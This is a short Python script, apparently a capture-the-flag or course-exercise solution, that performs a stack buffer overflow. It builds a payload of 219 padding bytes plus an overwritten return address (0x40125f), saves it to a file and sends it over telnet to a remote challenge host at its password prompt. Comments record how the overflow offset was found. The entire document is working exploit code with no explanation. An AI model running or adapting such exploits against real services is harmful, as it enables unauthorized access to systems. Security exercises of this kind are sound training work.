import struct
from telnetlib import Telnet

payload_address = struct.pack(
    '<Q',
    int('0x000000000040125f', base=16)
)

front_address = bytes("A" * 219, "utf-8")

with open("exploit.bin", "wb") as exploit_file:
    exploit_file.write(front_address)
    exploit_file.write(payload_address)
    exploit_file.write(b'\n')

with open("exploit.bin", "rb") as payload:
    payload = payload.read()
    print(payload)

with Telnet("cits4projtg.cybernemosyne.xyz", 1002) as tn:
    text = tn.read_until(b"Password: ")
    print(text.decode("utf-8"))
    tn.write(payload)
    for i in range(100):
     print(tn.read_some())
    
# Ah3Ah4Ah

# Pattern Ah3Ah4Ah first occurrence at position 219 in pattern.

# 0x000000000040125f
